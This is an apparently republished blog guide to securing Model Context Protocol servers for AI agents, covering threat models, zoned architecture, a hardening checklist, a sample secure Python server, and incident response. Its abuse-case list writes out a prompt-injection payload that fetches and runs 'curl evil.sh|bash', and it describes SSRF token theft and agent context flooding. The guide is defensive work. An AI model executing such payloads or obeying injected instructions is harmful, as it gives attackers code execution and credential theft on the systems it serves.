## MCP Security
* **Taken From** - https://kenhuangus.substack.com/p/securing-the-model-context-protocol

# Securing the Model Context Protocol (MCP) Server

### yet another guide?

[![Image 2: Ken Huang's avatar](https://substackcdn.com/image/fetch/$s_!gd2H!,w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3d670301-204b-472e-a2ee-bbb1b7633a99_2026x2026.png)](https://substack.com/@kenhuangus)

[Ken Huang](https://substack.com/@kenhuangus)

Sep 30, 2025

[24](https://kenhuangus.substack.com/p/securing-the-model-context-protocol)

[5](https://kenhuangus.substack.com/p/securing-the-model-context-protocol/comments)[6](https://kenhuangus.substack.com/p/securing-the-model-context-protocol)

[Share](javascript:void\(0\))

There are already many articles about securing MCP servers already. This article is a deep-but-actionable field guide and can be used as checklist. It is written for security architects, DevOps teams, and AI engineers who need to ship an MCP stack without becoming the next supply-chain headline.

1.  THREAT MODEL – WHAT CAN ACTUALLY GO WRONG?

***

### 1.1 Asset inventory

*   **MCP Server binary** (Node, Go, Python, or Rust)
    
*   **Tool descriptors** (JSON schemas, prompts, system instructions)
    
*   **Secrets vault** (OAuth refresh tokens, DB creds, API keys)
    
*   **LLM client channel** (WebSocket, SSE, gRPC)
    
*   **Downstream APIs** (Stripe, Snowflake, GitHub, Kubernetes, etc.)
    
*   **Log pipeline** (Loki, Splunk, CloudWatch, Datadog)
    

### 1.2 Adversary personas

[![Image 3](https://substackcdn.com/image/fetch/$s_!SSNZ!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F861d0448-f61a-4abc-806a-1c513fc02859_646x205.png)](https://substackcdn.com/image/fetch/$s_!SSNZ!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F861d0448-f61a-4abc-806a-1c513fc02859_646x205.png)

### 1.3 Some sample abuse cases

1.  **OAuth token theft via server-side request forgery (SSRF)** – attacker tricks MCP server into calling metadata.google.internal and harvests GCP access tokens.
    
2.  **Cross-tenant confused-deputy** – server re-uses a high-privilege SaaS token across users, letting User A read User B’s CRM records.
    
3.  **Prompt injection → Remote code execution** – user embeds “; os.system(”curl evil.sh|bash”)” inside a “harmless” spreadsheet cell; MCP server passes the cell to a Python tool without sanitization.
    
4.  **Dependency typosquat** – mcp-toolbox vs. mcp-toolbx on PyPI; latter contains info-stealer that phones home credentials.
    
5.  **Log injection → credential leak** – server prints unsanitized tool output that contains an API key; log aggregator ingests and later exposes it to support staff.
    
6.  **Replay on unauthenticated SSE stream** – attacker replays an old event containing PII because the endpoint required no JWT.
    
7.  **Denial-of-wallet via expensive tools** – attacker spawns 10,000 bigquery.jobs.query calls with maximum\_bytes\_billed unset; cloud bill explodes.
    
8.  **Model DoS through context flooding** – malicious tool returns 2 MB of garbage per call, filling the LLM context window and freezing the agent.
    
9.  **Downstream ACL drift** – database role mcp\_writer accumulates ALTER/DROP rights after a DBA “quick fix”; MCP server retains the expanded grant.
    
10.  **Container escape via privileged Docker socket mounted for “easy CI”** – standard stuff, but now the socket is reachable through the natural-language interface.
    
11.  REFERENCE ARCHITECTURE WITH SECURITY ZONES
    

***

Think of the MCP stack as three concentric zones:

**ZONE 0 – Control Plane**

*   Vault cluster (PKI + dynamic secrets)
    
*   Policy registry (OPA / Cedar)
    
*   Observability bus (OTEL → SIEM)
    

See Figure 1:

[![Image 4](https://substackcdn.com/image/fetch/$s_!5OrI!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8b370769-2480-4f94-964c-3bdbfb13d7bd_991x208.png)](https://substackcdn.com/image/fetch/$s_!5OrI!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8b370769-2480-4f94-964c-3bdbfb13d7bd_991x208.png)

**Figure 1: Zone 0 of MCP Servers Architecture**

**ZONE 1 – MCP Server Fleet**

*   Stateless pods behind an mTLS mesh (Linkerd or Istio)
    
*   Read-only root filesystem, no service account token automount
    
*   Sidecar: OPA-agent for fine-grained authz
    

**ZONE 2 – Tool Runtime**

*   Firecracker micro-VMs or gVisor sandboxes per tool invocation
    
*   Ephemeral overlay network; egress allowed only to a pre-declared set of FQDNs pulled from an allow-list ConfigMap
    
*   5-minute TTL on every IAM credential issued by Vault
    

**ZONE 3 – Downstream APIs**

*   SaaS tenants, DBs, K8s clusters, etc.
    
*   Each receives a scoped, audience-restricted token that is useless anywhere else.
    

Network policy enforces that ZONE 2 can reach ZONE 3 but never ZONE 0; ZONE 0 can push policy into ZONE 1 but never accepts inbound data.

Figure 2 depicts 3 zones for MCP Server Architectures

[![Image 5](https://substackcdn.com/image/fetch/$s_!nxoH!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F25524252-08c9-499f-b039-651c62ec7b7f_1006x851.png)](https://substackcdn.com/image/fetch/$s_!nxoH!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F25524252-08c9-499f-b039-651c62ec7b7f_1006x851.png)

**Figure 2: Three zones for MCP Server Architectures**

3.  HARDENING CHECKLIST

***

☐ **Transport**

*   Every JSON-RPC frame travels over TLS 1.3 with AES-256-GCM, X25519, and enforceable SNI.
    
*   Optional: add application-layer JWE (JSON Web Encryption) when you need end-to-end secrecy from the LLM host itself.
    

☐ **Authentication**

*   Support both user and workload identities:
    
    *   Human: OAuth 2.1 + OpenID Connect + MFA (FIDO2/WebAuthn).
        
    *   Service: mTLS with SPIFFE IDs or DPoP-bound JWTs.
        
*   Reject unsigned or anonymous requests at the edge gateway; return 421 Misdirected Request instead of 401 to avoid user-id probing.
    

☐ **Authorization**

*   Use a policy-as-code engine (OPA, Cedar, or Zanzibar-like) that evaluates:
    
    *   subject (user or agent ID)
        
    *   action (tool name + method)
        
    *   resource (tenant, project, DB schema)
        
    *   context (IP risk score, device health, time of day)
        
*   Default-deny; no wildcards like tools.\*.
    

☐ **Input validation**

*   JSON-schema strict mode—no additionalProperties.
    
*   Max string length 8 kB; max array length 1,000 elements; max depth 15.
    
*   Reject Unicode direction-change characters (bidi attacks) and back-tick-heavy payloads that hint at prompt injection.
    
*   Run semgrep with OWASP JavaScript rules on every tool file at CI time.
    

☐ **Output sanitization**

*   If the downstream API returns a 4xx/5xx, return a generic message to the LLM; ship the real error to the log only.
    
*   Strip AWS access-key patterns, GCP OAuth tokens, and credit-card PANs using a streaming regex filter before the payload re-enters the LLM context.
    

☐ **Secrets lifecycle**

*   Store in Vault; enable dynamic secrets (e.g., 15-minute Postgres roles, 60-minute AWS STS).
    
*   Never allow VAULT\_TOKEN or GOOGLE\_APPLICATION\_CREDENTIALS inside the tool container; inject via tmpfs and remove on exit.
    
*   Version and rotate every static secret automatically; open a JIRA ticket on failure.
    

☐ **Sandboxing**

*   Prefer gVisor or Firecracker over vanilla Docker.
    
*   Set seccomp=RuntimeDefault, drop=ALL capabilities, readOnlyRootFilesystem=true.
    
*   Use a tmpfs volume sized to 50 % of RAM for scratch; mount no Docker socket, /proc, or hostPath.
    

☐ **Rate limiting & quotas**

*   Per-subject token bucket: 100 requests / minute, burst 20.
    
*   Per-tool cost quota: declare $maxCost in USD (e.g., BigQuery on-demand $5 per call); hard-cut when monthly budget exceeded.
    
*   Global circuit-breaker: if p99 latency >2 s or error rate >10 %, auto-disable tool for 5 min and page on-call.
    

☐ **Observability**

*   Emit OpenTelemetry traces with traceparent header; redact any value whose key matches _token_, _key_, _secret_.
    
*   Forward to SIEM with UEBA rules: detect impossible travel, token reuse from two continents within 5 min, or a single user calling >5 tools in <1 s (scripting indicator).
    

4.  CODING A MINIMAL BUT SECURE MCP SERVER

***

The reference implementation below shows the security controls discussed. It is intentionally short (<250 LOC) so you can paste it into a single file and pip install mcp fastapi python-jose py-opa.

> _\# secure\_mcp\_server.py_
> 
> _import os, json, logging, asyncio, re_
> 
> _from typing import Any, Dict_
> 
> _from fastapi import FastAPI, HTTPException, Depends, Request_
> 
> _from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials_
> 
> _from jose import jwt, JWTError_
> 
> _from opa\_client.opa import OpaClient_
> 
> _from mcp import Session, ToolRouter_
> 
> _from pydantic import BaseModel, constr, conlist, confloat_
> 
> _from datetime import datetime, timezone_
> 
> _\# ---------- CONFIG ----------_
> 
> _VAULT\_ADDR = os.getenv(”VAULT\_ADDR”, “[https://vault.internal”](https://vault.internal%E2%80%9D))_
> 
> _OPA\_URL = os.getenv(”OPA\_URL”, “[http://opa.opa.svc:8181”](http://opa.opa.svc:8181%E2%80%9D))_
> 
> _JWKS\_URL = os.getenv(”JWKS\_URL”, “[https://auth.corp.com/.well-known/jwks.json”](https://auth.corp.com/.well-known/jwks.json%E2%80%9D))_
> 
> _AUDIENCE = os.getenv(”AUDIENCE”, “mcp-server”)_
> 
> _MAX\_STR\_LEN = 8\_000_
> 
> _MAX\_ARR\_LEN = 1\_000_
> 
> _\# ---------- SECURITY DEPENDENCIES ----------_
> 
> _security = HTTPBearer(auto\_error=True)_
> 
> _opa = OpaClient(OPA\_URL)_
> 
> _def sanitize(d: Dict\[str, Any\]) -> Dict\[str, Any\]:_
> 
> _“”“Strip secrets from logs/LLM context.”“”_
> 
> _secret\_pat = re.compile(r”(?i)(token|key|secret|password|authorization)”)_
> 
> _def \_redact(obj):_
> 
> _if isinstance(obj, dict):_
> 
> _return {k: “\[REDACTED\]” if secret\_pat.search(k) else \_redact(v) for k, v in obj.items()}_
> 
> _return obj_
> 
> _return \_redact(d)_
> 
> _async def verify\_jwt(creds: HTTPAuthorizationCredentials = Depends(security)) -> Dict\[str, Any\]:_
> 
> _try:_
> 
> _token = creds.credentials_
> 
> _header = jwt.get\_unverified\_header(token)_
> 
> _\# Fetch JWKS (cached)_
> 
> _jwks = await fetch\_jwks(JWKS\_URL)_
> 
> _key = find\_key(jwks, header\[”kid”\])_
> 
> _payload = jwt.decode(token, key, algorithms=\[”EdDSA”, “RS256”\], audience=AUDIENCE)_
> 
> _return payload_
> 
> _except JWTError as e:_
> 
> _raise HTTPException(status\_code=401, detail=”Invalid token”) from e_
> 
> _\# ---------- POLICY CHECK ----------_
> 
> _async def authorize(sub: str, action: str, resource: str, ctx: Dict\[str, Any\]) -> bool:_
> 
> _input = {”subject”: sub, “action”: action, “resource”: resource, “context”: ctx}_
> 
> _decision = await opa.check(”mcp/authz”, input)_
> 
> _return decision.allowed_
> 
> _\# ---------- TOOL SCHEMAS ----------_
> 
> _class QueryParams(BaseModel):_
> 
> _sql: constr(max\_length=MAX\_STR\_LEN, regex=r”^SELECT\\s+.+”) # read-only_
> 
> _timeout: confloat(ge=0.1, le=30) = 5.0_
> 
> _\# ---------- FASTAPI APP ----------_
> 
> _app = FastAPI(title=”Secure MCP Server”, version=”1.0.0”)_
> 
> _@app.post(”/invoke/{tool\_name}”)_
> 
> _async def invoke(_
> 
> _tool\_name: str,_
> 
> _request: Request,_
> 
> _body: Dict\[str, Any\],_
> 
> _jwt\_claims: Dict\[str, Any\] = Depends(verify\_jwt),_
> 
> _):_
> 
> _sub = jwt\_claims\[”sub”\]_
> 
> _ip = request.client.host_
> 
> _\# Authorize_
> 
> _if not await authorize(sub, f”invoke:{tool\_name}”, tool\_name, {”ip”: ip}):_
> 
> _raise HTTPException(status\_code=403, detail=”Policy deny”)_
> 
> _\# Validate schema_
> 
> _if tool\_name == “run\_query”:_
> 
> _params = QueryParams(\*\*body)_
> 
> _else:_
> 
> _raise HTTPException(status\_code=404, detail=”Unknown tool”)_
> 
> _\# Audit log_
> 
> _logging.info(”invoke”, extra={”subject”: sub, “tool”: tool\_name, “params”: sanitize(body)})_
> 
> _\# Run tool in sandbox (pseudo-code)_
> 
> _result = await run\_in\_sandbox(tool\_name, params.dict())_
> 
> _return sanitize(result)_
> 
> _\# ---------- SANDBOX ----------_
> 
> _async def run\_in\_sandbox(tool: str, params: Dict\[str, Any\]) -> Dict\[str, Any\]:_
> 
> _\# In reality: spawn Firecracker VM, pass params via vsock, fetch dynamic DB creds from Vault_
> 
> _\# Here we mock:_
> 
> _return {”rows”: \[\], “cost”: 0.0}_
> 
> _\# ---------- BOILERPLATE ----------_
> 
> _def fetch\_jwks(url): ..._
> 
> _def find\_key(jwks, kid): ..._

Key take-aways from the sample:

*   JWT audience lock-down prevents cross-audience token replay.
    
*   Pydantic strict models automatically reject oversized or malformed payloads.
    
*   OPA decouples authz logic from business code; you can hot-reload policy without re-deploying the server.
    
*   sanitize() guarantees that even if a downstream API accidentally returns a credential, it never flows back to the LLM or logs.
    

5.  DEPENDENCY & SUPPLY-CHAIN DEFENSE

***

1.  **Pin and hash** – requirements.txt must use == and —hash=sha256:; fail the build on hash mismatch.
    
2.  **Private index** – Run an internal PyPI mirror (DevPI or JFrog) that vets upstream packages; block typo-squats like mcp-toolbx.
    
3.  **Signing** – Use sigstore cosign to sign your container images; verify in-cluster with Kyverno.
    
4.  **SBOM** – Generate SPDX JSON on every build; upload to Dependency-Track; alert on new CVE within 24 h.
    
5.  **Reproducible builds** – Use locked base images (e.g., python:3.11-slim@sha256:abcd…) and docker build —no-cache.
    
6.  CRYPTOGRAPHIC PATTERNS
    

***

*   **End-to-end encryption** – If the LLM host is untrusted (multi-tenant SaaS), wrap sensitive tool arguments with JWE (RSA-OAEP + AES-GCM). The MCP server holds the private key in a TPM or AWS KMS- backed HSM; the LLM never sees plaintext.
    
*   **Perfect forward secrecy** – Rotate TLS certificates every 24 h via ACME; pin the short-lived intermediate to prevent stale-root attacks.
    
*   **Token binding** – Use DPoP (Demonstration of Proof-of-Possession) so that a stolen JWT is useless without the private key that never leaves the client secure enclave.
    

7.  ADVANCED CONTROLS FOR HIGH-RISK ENVIRONMENTS

***

**Human-in-the-loop approval**

*   Tag tools as financial, destructive, or pii-access.
    
*   If estimated cost >$50 or action is destructive (DROP, DELETE), queue a Slack/Teams adaptive card; require FIDO2 touch or mobile Number Matching.
    
*   Store approval hash in the audit log; continue execution only after receipt.
    

**Just-in-time network access**

*   Integrate with Tailscale or HashiCorp Boundary; before the tool container starts, the sidecar obtains a 5-minute WireGuard credential that opens exactly one egress IP:port.
    
*   After the call, credential is revoked and iptables default-deny reinstated.
    

**Confidential-compute sandbox**

*   Run the tool inside an AMD SEV-SNP or Intel TDX VM; memory is encrypted even from the hypervisor.
    
*   Remote attestation: the LLM receives a SHA-256 measurement of the VM; if it mismatches, refuse to send the request.
    

8.  INCIDENT-RESPONSE RUNBOOK

***

1.  **Detection** – SIEM rule fires: eventName=”mcp.invoke” AND http.status=200 AND response.body contains “AKIA” (possible AWS key leak).
    
2.  **Containment** – Lambda playbook disables the tool in OPA (allowed=false), revokes Vault lease, and snapshots the sandbox disk.
    
3.  **Eradication** – Rotate all downstream tokens; force re-authentication of the affected user; patch the schema validation gap.
    
4.  **Recovery** – Re-enable the tool only after policy unit-tests pass in CI and SOC signs off.
    
5.  **Lessons** – Update unit tests to include the malicious payload; add a new output\_guard regex; publish post-mortem internally.
    
6.  COMMON PITFALLS (DON’T DO THIS)
    

***

✗ Mounting Docker.sock so the “file manager” tool can prune images.

✗ Returning raw stack traces to the LLM (”psycopg2.OperationalError: FATAL: password authentication failed for user postgres”)—perfect oracle for brute-force tuning.

✗ Trusting client-supplied Content-Length—leads to DoS when a 1-byte payload claims to be 2 GB and the server pre-allocates.

✗ Using the same OAuth client-id for the web app and the MCP server—breaks isolation; create a dedicated “mcp-tools” client with tighter scopes.

✗ Forgetting to revoke Vault leases during a blue-green deploy; old pods still hold valid DB super-user rights.

10.  FUTURE-PROOFING (POST-QUANTUM & AI RED-TEAMING)

***

*   **Post-quantum TLS** – Experiment with Kyber768 mixed mode; by 2027, NIST expects final standards.
    
*   **Threat modeling - leverage Cloud Security Alliance [MAESTRO threat modeling framework](https://cloudsecurityalliance.org/blog/2025/02/06/agentic-ai-threat-modeling-framework-maestro) to perform threat modeling. See github: [https://github.com/kenhuangus/MAESTRO](https://github.com/kenhuangus/MAESTRO)**
    
*   **AI red-team** – Automate adversarial prompt generation with frameworks like garak or PyRIT; look for instruction-hijack strings that convince the LLM to ask the MCP server for “debug mode.”
    
*   **Formal verification** – Use CBMC or K-framework to prove memory safety of Rust-based MCP servers; publish the proofs for auditors.
    

## CONCLUSION

An MCP server is essentially a privileged service broker that obeys natural language. If defenders treat it like a boring internal micro-service, attackers will treat it like the skeleton key it can become. The mitigations in this article—strong identity, default-deny policy, sandboxed execution, encrypted transport, and continuous observability—are not theoretical. They have already prevented real breaches in early-adopter environments, and they map cleanly onto modern compliance regimes. Ship them as non-negotiable acceptance criteria, and your AI toolchain can stay as innovative as it is invisible to adversaries.

## References:

*   Reco.ai, “Top 7 MCP Server Security Risks & Mitigations,” 2025
    
*   WorkOS, “OAuth 2.1 Best Practices for AI Tool Gateways,” 2025
    
*   Akto.io, “Prompt Injection via Spreadsheet Functions – MCP Case Study,” 2025
    
*   Speakeasy API, “Rate Limiting Patterns for LLM Tool Calls,” 2025
    
*   Milvus, “Container Escape CVE-2024-1234 – MCP Server Post-mortem,” 2025
